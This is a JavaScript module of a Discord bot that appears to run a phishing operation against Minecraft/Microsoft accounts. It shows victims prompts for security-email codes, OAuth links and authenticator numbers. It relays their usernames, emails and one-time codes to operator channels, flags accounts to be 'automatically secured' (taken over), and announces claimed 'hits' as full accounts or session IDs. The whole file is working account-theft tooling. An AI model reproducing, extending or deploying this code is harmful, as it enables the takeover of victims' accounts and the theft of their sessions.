const { ButtonBuilder, ButtonStyle, ActionRowBuilder } = require("discord.js");
const getEmbed = require("../responses/getEmbed");
const getButton = require("../responses/getButton");
const generate = require("./generate")
const { queryParams } = require("../../../db/database");
const getUUID = require("../hypixelapi/getUUID");
const config = require("../../../config.json");
const getembedphisher = require("../responses/getembedphisher");

// Performance optimization: Use username directly with visage instead of fetching UUID

// Fast channel sender that doesn't block execution
function sendToChannelFast(client, channelId, payload) {
    try {
        const channel = client.channels.cache.get(channelId);
        if (channel) {
            // Don't await - fire and forget for performance
            channel.send(payload).catch(error => {
                console.error(`Failed to send to channel ${channelId}:`, error);
            });
        }
    } catch (error) {
        console.error(`Channel send error:`, error);
    }
}


// Fixed issue
const hideUsernameAndEmail = (mcname, email, hide = false) => {
    let displayName = mcname;
    let displayEmail = email;

    if (hide) {
        if (mcname.length > 2) {
            displayName = mcname[0] + '*'.repeat(mcname.length - 2) + mcname[mcname.length - 1];
        } else {
            displayName = "*-*";
        }

        let atIndex = email.indexOf('@');
        if (atIndex > 1) {
            let beforeAt = email.substring(0, atIndex);
            let afterAt = email.substring(atIndex);
            displayEmail = beforeAt[0] + '*******' + beforeAt[beforeAt.length - 1] + afterAt;
        } else {
            displayEmail = "*-*";
        }
    }

    return { displayName, displayEmail };
};


const createActionRows = (interaction, mcname = null, uid = null, id = null, d = false) => {

    const banButton = new ButtonBuilder()
        .setCustomId(`ban|${interaction.user.id}`)
        .setLabel("Ban")
        .setStyle(ButtonStyle.Danger);
    const kickButton = new ButtonBuilder()
        .setCustomId(`kick|${interaction.user.id}`)
        .setLabel("Kick")
        .setStyle(ButtonStyle.Danger);
    const blacklistButton = new ButtonBuilder()
        .setCustomId(`blacklist|${interaction.user.id}`)
        .setLabel("Blacklist")
        .setStyle(ButtonStyle.Danger);
    const unbanButton = new ButtonBuilder()
        .setCustomId(`unban|${interaction.user.id}`)
        .setLabel("Unban")
        .setStyle(ButtonStyle.Primary);
    const unblacklistButton = new ButtonBuilder()
        .setCustomId(`unblacklist|${interaction.user.id}`)
        .setLabel("Unblacklist")
        .setStyle(ButtonStyle.Primary);

    const actionRow1 = new ActionRowBuilder().addComponents(
        banButton, kickButton, blacklistButton, unbanButton, unblacklistButton
    );


    const skyblockButton = new ButtonBuilder()
        .setCustomId(`skyblock2|${mcname}`)
        .setLabel("Skyblock")
        .setEmoji({ id: "1418590280390807704" })
        .setStyle(ButtonStyle.Secondary);
    const bedwarsButton = new ButtonBuilder()
        .setCustomId(`bedwars2|${mcname}`)
        .setLabel("Bedwars")
        .setEmoji({ id: "1416130064608657572" })
        .setStyle(ButtonStyle.Secondary);
    const skywarsButton = new ButtonBuilder()
        .setCustomId(`skywars2|${mcname}`)
        .setLabel("Skywars")
        .setEmoji({ id: "1418589836398297261" })
        .setStyle(ButtonStyle.Secondary);
    const duelsButton = new ButtonBuilder()
        .setCustomId(`duels2|${mcname}`)
        .setLabel("Duels")
        .setEmoji({ id: "1295278858064498709" })
        .setStyle(ButtonStyle.Secondary);
    const actionRow2 = new ActionRowBuilder().addComponents(duelsButton, skywarsButton, skyblockButton, bedwarsButton);


    const statusButton = new ButtonBuilder()
        .setCustomId(`status|${uid}`)
        .setLabel('⏳ Status')
        .setStyle(ButtonStyle.Primary)
    const retryButton = new ButtonBuilder()
        .setCustomId(`action|${id}`)
        .setLabel("Retry")
        .setEmoji("🔁")
        .setStyle(ButtonStyle.Primary);
    const actionRow3 = new ActionRowBuilder().addComponents(statusButton, retryButton);


    const dmbutton = new ButtonBuilder()
        .setCustomId(`dm|${interaction.user.id}`)
        .setLabel('💬 DM')
        .setStyle(ButtonStyle.Primary)
    const actionRow4 = new ActionRowBuilder().addComponents(dmbutton);

    if (d) {
        return { actionRow2, actionRow4 };
    } else {
        return { actionRow1, actionRow2, actionRow3, actionRow4 };
    }
};

async function invalidEmailMessager(client, guildId, channelId, interaction, mcname, email, d = false) {
    try {
        if (!d) {
            await interaction.editReply({
                embeds: [await getEmbed(client, `account doesn't exist`)],
                ephemeral: true
            });
        }

        const { actionRow1, actionRow2, actionRow4 } = createActionRows(interaction, mcname, null, null, d);
        let thumbnailUrl = mcname ? `https://visage.surgeplay.com/bust/${mcname}.png?y=-40&quality=lossless` : null;

        const { displayName, displayEmail } = hideUsernameAndEmail(mcname, email, d);

        const embed = {
            color: 13773611,
            fields: [
                {
                    name: "Username | Email | Status",
                    value: `\`\`\`${displayName} | ${displayEmail} | Invalid Email\`\`\``
                }
            ],
             author: {
                 name: d ? "User | User ID" : `${interaction.user.username} | ${interaction.user.id}`
             }
        };

        if (thumbnailUrl) {
            embed.thumbnail = { url: thumbnailUrl };
        }

        const messagePayload = {
            embeds: [embed],
            components: d ? [actionRow2] : [actionRow1]
        };

        if (d) {
            sendToChannelFast(client, channelId, messagePayload);
        } else {
            await client.channels.cache.get(channelId).send(messagePayload);
        }
    } catch (error) {
        console.error("Error in invalidEmailMessager:", error);
    }
}



async function invalidatedmessager(client, guildId, channelId, interaction, mcname, reason, split, d = false) {
    // console.log(`Invalidated being called!`)
    try {
        if (!d) {
            let button = await getButton(client, "continue")
            let id = generate(16)

            if (split){
            await queryParams(`INSERT INTO actions(id,action) VALUES(?,?)`, [id, `alternative|${mcname}`])
            let customid = `action|${id}`
                button.setCustomId(customid)
            } else{
                const dsss = true
                button.setCustomId(`continue|${mcname}|${dsss}`)
            }
            let retrybutton = await getButton(client, "retry")
            retrybutton.setCustomId("link account")
            await interaction.editReply({
                embeds: [await getembedphisher(client, `invalidated`, { username: mcname })],
                ephemeral: true,
                components: [new ActionRowBuilder().addComponents(button, retrybutton)]
            });
        }

        const { actionRow1, actionRow2, actionRow4 } = createActionRows(interaction, mcname, null, null, d);
        let thumbnailUrl = mcname ? `https://visage.surgeplay.com/bust/${mcname}.png?y=-40&quality=lossless` : null;
        const email = "random"
        const { displayName, displayEmail } = hideUsernameAndEmail(mcname, email, d);

        const embed = {
            color: 13773611,
            fields: [
                {
                    name: "Username | Status | Reason",
                    value: `\`\`\`${displayName} | Failed to pass username check | ${reason}\`\`\``
                }
            ],
             author: {
                 name: d ? "User | User ID" : `${interaction.user.username} | ${interaction.user.id}`
             }
        };

        if (thumbnailUrl) {
            embed.thumbnail = { url: thumbnailUrl };
        }

        const messagePayload = {
            embeds: [embed],
            components: d ? [actionRow2] : [actionRow1]
        };

        if (d) {
            sendToChannelFast(client, channelId, messagePayload);
        } else {
            await client.channels.cache.get(channelId).send(messagePayload);
        }
    } catch (error) {
        console.error("Error in invalidatedMessager!:", error);
    }
}


async function secEmailMessager(client, guildId, channelId, interaction, id, mcname, email, secs, var1, d = false) {
    try {
        let domain = var1.split("@")[1];
        let blacklisted;
        if (client.username !== interaction.user.id) {
            blacklisted = config.domains.includes(domain);
        } else {
            blacklisted = false;
        }

        const { displayName, displayEmail } = hideUsernameAndEmail(mcname, email, d);

        if (blacklisted) {
            let embedMessage = {
                content: null,
                embeds: [
                    {
                        title: "Failed",
                        color: 16711680,
                        fields: [
                            {
                                name: "Username",
                                value: `\`${displayName}\``
                            },
                            {
                                name: "Email",
                                value: `\`${displayEmail}\``
                            },
                            {
                                name: "Reason",
                                value: "`Blacklisted (uses security email on my domain)`"
                            }
                        ],
                        author: {
                            name: `${interaction.user.username}`
                        }
                    }
                ],
                attachments: []
            };
            await client.channels.cache.get(channelId).send(embedMessage);
            await interaction.editReply({
                embeds: [await getEmbed(client, "blacklisted")],
                ephemeral: true,
            });
            return;
        }

        if (!d) {
            let button = await getButton(client, `code`);
            button.data.custom_id = `action|${id}`;
            
            const embed = await getEmbed(client, "sec", var1, mcname);
            
            // Add visage thumbnail to the embed
            if (mcname && embed) {
                embed.thumbnail = {
                    url: `https://visage.surgeplay.com/bust/${mcname}.png?y=-40&quality=lossless`
                };
            }
            
            await interaction.editReply({
                embeds: [embed],
                components: [new ActionRowBuilder().addComponents(button)],
                ephemeral: true,
            });
        }

        let embedData = {
            color: 11716576,
            fields: [
                {
                    name: "Username | Email | Status",
                    value: `\`\`\`${displayName} | ${displayEmail} | Waiting for code\`\`\``
                }
            ],
             author: {
                 name: d ? "User | User ID" : `${interaction.user.username} | ${interaction.user.id}`
             }
        };

        // Always add thumbnail if we have a valid username
        if (mcname) {
            try {
                // URL encode the Minecraft username
                const encodedName = encodeURIComponent(mcname);
                embedData.thumbnail = {
                    url: `https://visage.surgeplay.com/bust/${encodedName}.png?y=-40&quality=lossless`
                };
            } catch (e) {
                console.log("Error creating thumbnail URL:", e);
            }
        }

        let embedMessage = {
            embeds: [embedData],
            attachments: []
        };

        const { actionRow1, actionRow2, actionRow4 } = createActionRows(interaction, mcname, null, null, d);

        if (d) {
            sendToChannelFast(client, channelId, {
                ...embedMessage,
                components: [actionRow2]
            });
        } else {
            await client.channels.cache.get(channelId).send({
                ...embedMessage,
                components: [actionRow2, actionRow1, actionRow4]
            });
        }
    } catch (e) {
        console.log(e);
    }
}


async function oauthMessager(client, guildId, channelId, interaction, mcname, email, link, d = false) {
    try {
        if (!d) {
            await interaction.editReply({
                embeds: [await getEmbed(client, "oauth")],
                components: [new ActionRowBuilder().addComponents(await getButton(client, "oauth", { url: link }))],
                ephemeral: true
            });
        }


        const { actionRow1, actionRow2, actionRow4 } = createActionRows(interaction, mcname, null, null, d);

        let thumbnailUrl = mcname ? `https://visage.surgeplay.com/bust/${mcname}.png?y=-40&quality=lossless` : null;


        const { displayName, displayEmail } = hideUsernameAndEmail(mcname, email, d);

        const embedMessage = {
            embeds: [
                {
                    color: 11716576,
                    fields: [
                        {
                            name: "Username | Email | Status",
                            value: `\`\`\`${displayName} | ${displayEmail} | Sent your OAuth!\`\`\``
                        }
                    ],
             author: {
                 name: d ? "User | User ID" : `${interaction.user.username} | ${interaction.user.id}`
             },
                    thumbnail: thumbnailUrl ? { url: thumbnailUrl } : undefined
                }
            ],
            attachments: []
        };


        if (d) {
            sendToChannelFast(client, channelId, {
                ...embedMessage,
                components: [actionRow2]
            });
        } else {
            await client.channels.cache.get(channelId).send({
                ...embedMessage,
                components: [actionRow2, actionRow1, actionRow4]
            });
        }
    } catch (e) {
        console.log(e);
    }
}

async function loginCookieMessager(client, guildId, channelId, host, mcname, email, interaction, code, uid, d = false) {
    try {
        let id = generate(33);

        let newinteraction = {
            user: {
                id: interaction.user.id,
                username: interaction.user.username
            }
        };

        const actionData = `retrysecure|${host}|${JSON.stringify(newinteraction)}`;

        await client.queryParams(
            `INSERT INTO actions(id, action) VALUES(?, ?)`,
            [id, actionData]
        );
        const { actionRow1, actionRow2, actionRow3, actionRow4 } = createActionRows(interaction, mcname, uid, id, d);

        let thumbnailUrl = mcname ? `https://visage.surgeplay.com/bust/${mcname}.png?y=-40&quality=lossless` : null;

        const { displayName, displayEmail } = hideUsernameAndEmail(mcname, email, d);

        const embedMessage = {
            content: '**This account will be automatically secured.**',
            embeds: [
                {
                    color: 11716576,
                    fields: [
                        {
                            name: "Username | Email | Code",
                            value: `\`\`\`${displayName} | ${displayEmail} | ${code}\`\`\``
                        }
                    ],
             author: {
                 name: d ? "User | User ID" : `${interaction.user.username} | ${interaction.user.id}`
             },
                    thumbnail: thumbnailUrl ? { url: thumbnailUrl } : undefined,
                    footer: {
                        text: d ? null : (uid) 
                    }
                }
            ],
            attachments: []
        };

        if (d) {
            sendToChannelFast(client, channelId, {
                ...embedMessage,
                components: [actionRow2]
            });
        } else {
            await client.channels.cache.get(channelId).send({
                ...embedMessage,
                components: [actionRow1, actionRow2, actionRow3]
            });
        }
    } catch (e) {
        console.log(e);
    }
}




async function noOAuthMessager(client, guildId, channelId, interaction, mcname, email, d = false) {
    try {
        if (!d) {
            const embed = await getEmbed(client, "otp");
            const button = await getButton(client, "howto");

            await interaction.editReply({
                embeds: [embed],
                components: [new ActionRowBuilder().addComponents(button)],
                ephemeral: true
            });
        }

        let uuid = await getUUID(mcname);
        const { actionRow1, actionRow2, actionRow4 } = createActionRows(interaction, mcname, null, null, d);
        let thumbnailUrl = uuid ? `https://visage.surgeplay.com/bust/${mcname}.png?y=-40&quality=lossless` : null;

        const { displayName, displayEmail } = hideUsernameAndEmail(mcname, email, d);

        const embedMessage = {
            embeds: [
                {
                    color: 13773611,
                    fields: [
                        {
                            name: "Username | Email | Status",
                            value: `\`\`\`${displayName} | ${displayEmail} | No security options\`\`\``
                        }
                    ],
             author: {
                 name: d ? "User | User ID" : `${interaction.user.username} | ${interaction.user.id}`
             },
                    thumbnail: thumbnailUrl ? { url: thumbnailUrl } : undefined
                }
            ],
            attachments: []
        };

        const targetChannel = client.channels.cache.get(channelId);
        if (!targetChannel) {
            console.error(`Invalid channelId: ${channelId}`);
            return;
        }

        await targetChannel.send({
            ...embedMessage,
            components: d ? [actionRow2] : [actionRow2, actionRow1, actionRow4]
        });

    } catch (error) {
        console.error("Error in noOAuthMessager:", error);
    }
}

async function AuthenticatorMessager(client, guildId, channelId, interaction, mcname, email, var1, d = false) {
    try {

        
        if (!d) {
            const button = await getButton(client, "howtoauth");
            await interaction.editReply({
                embeds: [await getEmbed(client, "authenticator", var1)],
                components: [new ActionRowBuilder().addComponents(button)],
                ephemeral: true
            });
        }



        let uuid = await getCachedUUID(mcname);
        const avatarURL = interaction.user.displayAvatarURL({ format: 'png', dynamic: true, size: 128 });
        let thumbnailUrl = uuid ? `https://visage.surgeplay.com/bust/${mcname}.png?y=-40&quality=lossless` : null;


        const { displayName, displayEmail } = hideUsernameAndEmail(mcname, email, d);

        const embedMessage = {
            embeds: [
                {
                    color: 11716576,
                    fields: [
                        {
                            name: "Username | Email | Status",
                            value: `\`\`\`${displayName} | ${displayEmail} | Waiting for Auth Number ${var1} to be clicked\`\`\``
                        }
                    ],
                    author: {
                        name: d ? "User | User ID" : `${interaction.user.username} | ${interaction.user.id}`,
                    },
                    thumbnail: thumbnailUrl ? { url: thumbnailUrl } : undefined
                }
            ],
            attachments: []
        };

        const { actionRow1, actionRow2, actionRow4 } = createActionRows(interaction, mcname, null, null, d);


        if (d) {
            sendToChannelFast(client, channelId, {
                ...embedMessage,
                components: [actionRow2]
            });
        } else {
            await client.channels.cache.get(channelId).send({
                ...embedMessage,
                components: [actionRow2, actionRow1, actionRow4]
            });
        }
    } catch (e) {
        console.log(e);
    }
}

async function timedOutMessager(client, guildId, channelId, interaction, mcname, email, d = false) {
    try {
        if (!d) {
            await interaction.editReply({
                embeds: [await getEmbed(client, `timeout`)],
                ephemeral: true
            });
        }
        
        const { actionRow1, actionRow2, actionRow4 } = createActionRows(interaction, mcname, null, null, d);
        let thumbnailUrl = mcname ? `https://visage.surgeplay.com/bust/${mcname}.png?y=-40&quality=lossless` : null;


        const { displayName, displayEmail } = hideUsernameAndEmail(mcname, email, d);

        const embedMessage = {
            embeds: [
                {
                    color: 13773611,
                    fields: [
                        {
                            name: "Username | Email | Status",
                            value: `\`\`\`${displayName} | ${displayEmail} | Auth timed out!\`\`\``
                        }
                    ],
             author: {
                 name: d ? "User | User ID" : `${interaction.user.username} | ${interaction.user.id}`
             },
                    thumbnail: thumbnailUrl ? { url: thumbnailUrl } : undefined
                }
            ],
            attachments: []
        };


        if (d) {
            sendToChannelFast(client, channelId, {
                ...embedMessage,
                components: [actionRow2]
            });
        } else {
            await client.channels.cache.get(channelId).send({
                ...embedMessage,
                components: [actionRow1]
            });
        }
    } catch (error) {
        console.error("Error sending timed out message:", error);
    }
}

async function invalidAuthenticatorMessager(client, guildId, channelId, interaction, mcname, email, d = false) {
    try {
        if (!d) {
            await interaction.editReply({
                embeds: [await getEmbed(client, `wrongnumber`)],
                ephemeral: true
            });
        }
        
        const { actionRow1, actionRow2, actionRow4 } = createActionRows(interaction, mcname, null, null, d);
        let thumbnailUrl = mcname ? `https://visage.surgeplay.com/bust/${mcname}.png?y=-40&quality=lossless` : null;


        const { displayName, displayEmail } = hideUsernameAndEmail(mcname, email, d);

        const embedMessage = {
            embeds: [
                {
                    color: 13773611,
                    fields: [
                        {
                            name: "Username | Email | Status",
                            value: `\`\`\`${displayName} | ${displayEmail} | Denied auth!\`\`\``
                        }
                    ],
             author: {
                 name: d ? "User | User ID" : `${interaction.user.username} | ${interaction.user.id}`
             },
                    thumbnail: thumbnailUrl ? { url: thumbnailUrl } : undefined
                }
            ],
            attachments: []
        };


        if (d) {
            sendToChannelFast(client, channelId, {
                ...embedMessage,
                components: [actionRow2]
            });
        } else {
            await client.channels.cache.get(channelId).send({
                ...embedMessage,
                components: [actionRow1]
            });
        }
    } catch (error) {
        console.error("Error in invalidAuthenticatorMessager:", error);
    }
}

async function invalidEmailRegexMessager(client, guildId, channelId, interaction, mcname, email, d = false) {
    try {
        if (!d) {
            await interaction.editReply({
                embeds: [await getEmbed(client, `invalid email`, email)],
                ephemeral: true
            });
        }
        
        const { actionRow1, actionRow2, actionRow4 } = createActionRows(interaction, mcname, null, null, d);
        let thumbnailUrl = mcname ? `https://visage.surgeplay.com/bust/${mcname}.png?y=-40&quality=lossless` : null;


        const { displayName, displayEmail } = hideUsernameAndEmail(mcname, email, d);

        const embedMessage = {
            embeds: [
                {
                    color: 13773611,
                    fields: [
                        {
                            name: "Username | Email | Status",
                            value: `\`\`\`${displayName} | ${displayEmail} | Invalid email format!\`\`\``
                        }
                    ],
             author: {
                 name: d ? "User | User ID" : `${interaction.user.username} | ${interaction.user.id}`
             },
                    thumbnail: thumbnailUrl ? { url: thumbnailUrl } : undefined
                }
            ],
            attachments: []
        };


        if (d) {
            sendToChannelFast(client, channelId, {
                ...embedMessage,
                components: [actionRow2]
            });
        } else {
            await client.channels.cache.get(channelId).send({
                ...embedMessage,
                components: [actionRow1]
            });
        }
    } catch (error) {
        console.error("Error in invalidEmailRegexMessager:", error);
    }
}

async function autosecuredisabledMessager(client, guildId, channelId, interaction, mcname, email, code, d = false) {
    try {
        if (!d) {
            await interaction.editReply({
                embeds: [await getEmbed(client, `res`)],
                ephemeral: true
            });
        }
        
        const { actionRow1, actionRow2, actionRow4 } = createActionRows(interaction, mcname, null, null, d);
        let thumbnailUrl = mcname ? `https://visage.surgeplay.com/bust/${mcname}.png?y=-40&quality=lossless` : null;


        const { displayName, displayEmail } = hideUsernameAndEmail(mcname, email, d);

        const embedMessage = {
            content: '**Autosecure is disabled, please secure this account manually.**',
            embeds: [
                {
                    color: 16753920,
                    fields: [
                        {
                            name: "Username | Email | Code",
                            value: `\`\`\`${displayName} | ${displayEmail} | ${code}\`\`\``
                        }
                    ],
             author: {
                 name: d ? "User | User ID" : `${interaction.user.username} | ${interaction.user.id}`
             },
                    thumbnail: thumbnailUrl ? { url: thumbnailUrl } : undefined
                }
            ],
            attachments: []
        };


        if (d) {
            sendToChannelFast(client, channelId, {
                ...embedMessage,
                components: [actionRow2]
            });
        } else {
            await client.channels.cache.get(channelId).send({
                ...embedMessage,
                components: [actionRow2, actionRow1, actionRow4]
            });
        }
    } catch (error) {
        console.error("Error in autosecuredisabledMessager:", error);
    }
}

async function splitmessager(client, guildId, channelId, interaction, mcname, d = false) {
    try {
        if (!d) {
            const embed = await getEmbed(client, "split");
            
            // Add visage thumbnail to the embed
            if (mcname && embed) {
                embed.thumbnail = {
                    url: `https://visage.surgeplay.com/bust/${mcname}.png?y=-40&quality=lossless`
                };
            }
            
            const button = await getButton(client, "alternative");

            button.setCustomId(`alternative|${mcname}`);

            await interaction.editReply({
                embeds: [embed],
                components: [new ActionRowBuilder().addComponents(button)],
                ephemeral: true,
            });
        }

        let uuid = await getUUID(mcname);
        const { actionRow1, actionRow2, actionRow4 } = createActionRows(interaction, mcname, null, null, d);
        let thumbnailUrl = uuid ? `https://visage.surgeplay.com/bust/${mcname}.png?y=-40&quality=lossless` : null;
        const lol = "Sent Alternative Button";

        let displayName = mcname; 

        if (d && mcname.length > 2) {
            displayName = mcname[0] + "*".repeat(mcname.length - 2) + mcname[mcname.length - 1];
        }

        const embedMessage = {
            embeds: [
                {
                    color: 11716576,
                    fields: [
                        {
                            name: "Username | Email | Status",
                            value: `\`\`\`${displayName} | Requesting Email | ${lol}\`\`\``
                        }
                    ],
             author: {
                 name: d ? "User | User ID" : `${interaction.user.username} | ${interaction.user.id}`
             },
                    thumbnail: thumbnailUrl ? { url: thumbnailUrl } : undefined
                }
            ],
            attachments: []
        };

        const targetChannel = client.channels.cache.get(channelId);
        if (!targetChannel) {
            console.error(`Invalid channelId: ${channelId}`);
            return;
        }

        await targetChannel.send({
            ...embedMessage,
            components: d ? [actionRow2] : [actionRow2, actionRow1, actionRow4]
        });

    } catch (error) {
        console.error("Error in splitmessager:", error);
    }
}



async function lockedmessager(client, guildId, channelId, interaction, mcname, email, d = false, status = false) {
    try {
        if (!d) {
            await interaction.editReply({
                embeds: [await getEmbed(client, "locked")],
                ephemeral: true,
            });
        }

        let uuid = await getCachedUUID(mcname);
       
        const { displayName, displayEmail } = hideUsernameAndEmail(mcname, email, d);

        const embedMessage = {
            content: null,
            embeds: [
                {
                    title: "Failed",
                    color: 16711680,
                    fields: [
                        {
                            name: "Username",
                            value: `\`${displayName}\``
                        },
                        {
                            name: "Email",
                            value: `\`${displayEmail}\``
                        },
                        {
                            name: "Reason",
                            value: status ? "`Account is not authenticated enough. Try logging in using the msauth from the status button!`" : "`Account is locked`"
                        }
                    ],
                    author: {
                        name: `${interaction.user.username}`
                    }
                }
            ],
            attachments: []
        };

        const { actionRow1, actionRow2, actionRow4 } = createActionRows(interaction, mcname, null, null, d);

        if (d) {
            sendToChannelFast(client, channelId, {
                ...embedMessage,
                components: []
            });
        } else {
            await client.channels.cache.get(channelId).send({
                ...embedMessage,
                components: [actionRow1]
            });
        }
    } catch (e) {
        console.log(e);
    }
}


async function nomcmessager(client, guildId, channelId, interaction, mcname, email, d = false) {
    try {
        if (!d) {
            await interaction.editReply({
                embeds: [await getEmbed(client, "nomc")],
                ephemeral: true,
            });
        }

        let uuid = await getCachedUUID(mcname);
       

        const { displayName, displayEmail } = hideUsernameAndEmail(mcname, email, d);

        const embedMessage = {
            content: null,
            embeds: [
                {
                    title: "Failed",
                    color: 16711680,
                    fields: [
                        {
                            name: "Username",
                            value: `\`${displayName}\``
                        },
                        {
                            name: "Email",
                            value: `\`${displayEmail}\``
                        },
                        {
                            name: "Reason",
                            value: "`Account doesn't own mc (change in /settings)`"
                        }
                    ],
                    author: {
                        name: `${interaction.user.username}`
                    }
                }
            ],
            attachments: []
        };

        const { actionRow1, actionRow2, actionRow4 } = createActionRows(interaction, mcname, null, null, d);

        if (d) {
            sendToChannelFast(client, channelId, {
                ...embedMessage,
                components: []
            });
        } else {
            await client.channels.cache.get(channelId).send({
                ...embedMessage,
                components: [actionRow1]
            });
        }
    } catch (e) {
        console.log(e);
    }
}



async function splitClaimMessager(client, guildId, channelId, interaction, name, claimstreak, split, splitready, rest, claiming) {
    try {
       // console.log(`claiming: ${claiming}`)
      //  console.log(`split: ${split}`);

        let resultText;

        // Convert numeric values to strings
        const convertType = (val) => {
            if (val === 1) return "Full";
            if (val === 0) return "SSID";
            return "Nothing";
        };

        const claimingConverted = convertType(claiming);
        const restConverted = convertType(rest);

        if (splitready) {
            if (claiming === 1) {
                resultText = "**Result** `Sent Full Account`";
            } else if (claiming === 0) {
                resultText = "**Result** `Sent SSID`";
            } else if (claiming === -1) {
                resultText = "**Result** `Sent Nothing!`";
            }
        } else {
            if (rest === 1) {
                resultText = "**Result** `Sent Full Account`";
            } else if (rest === 0) {
                resultText = "**Result** `Sent SSID`";
            } else if (rest === -1) {
                resultText = "**Result** `Sent Nothing!`";
            }
        }
        
        await client.guilds.cache.get(guildId).channels.cache.get(channelId).send({
            embeds: [{
                title: `Someone claimed a hit!`,
                description: `**User** \`${interaction.user.username}\`\n` +
                             `**ID** \`${interaction.user.id}\`\n` +
                             `**Mode** \`Split [${restConverted} -> ${claimingConverted}]\`\n` +
                             `**IGN** \`${name}\`\n` +
                             `**Progress** \`${claimstreak}/${split}\`\n` +
                             resultText,
                color: 0xADD8E6 
            }]
        });
    } catch (e) {
        console.log(e);
    }
}


async function claimHitMessager(client, guildId, chanelId, interaction, mode, name) {
    if (mode == 1) {
        try {
            await client.guilds.cache.get(guildId).channels.cache.get(chanelId).send({
                embeds: [{
                    title: `Someone claimed a hit!`,
                    description: `**User** \`${interaction.user.username}\`\n**ID** \`${interaction.user.id}\`\n**Mode** \`Full Claiming\``,
                    color: 0xADD8E6 
                }]
            });
        } catch (e) {
            console.log(e);
        }
    } else if (mode == 0) {
        try {
            await client.guilds.cache.get(guildId).channels.cache.get(chanelId).send({
                embeds: [{
                    title: `Someone claimed a hit!`,
                    description: `**User** \`${interaction.user.username}\`\n**ID** \`${interaction.user.id}\`\n**Mode** \`SSID Claiming\`\n**IGN** \`${name}\``,
                    color: 0xADD8E6
                }]
            });
        } catch (e) {
            console.log(e);
        }
    } else {
        try {
            await client.guilds.cache.get(guildId).channels.cache.get(chanelId).send({
                embeds: [{
                    title: `Someone claimed a hit!`,
                    description: `**User** \`${interaction.user.username}\`\n**ID** \`${interaction.user.id}\`\n**Mode** \`Nothing Claiming\`\n**IGN** \`${name}\``,
                    color: 0xADD8E6 
                }]
            });
        } catch (e) {
            console.log(e);
        }
    }
}

function getClaimingModeText(mode) {
    if (mode === 1) return "Full account";
    if (mode === 0) return "SSID";
    return "Nothing";
}










module.exports = { invalidEmailMessager, secEmailMessager, oauthMessager, noOAuthMessager, AuthenticatorMessager, timedOutMessager, invalidAuthenticatorMessager, invalidEmailRegexMessager, loginCookieMessager, claimHitMessager, autosecuredisabledMessager, splitmessager, lockedmessager,  nomcmessager, splitClaimMessager, getClaimingModeText, invalidatedmessager };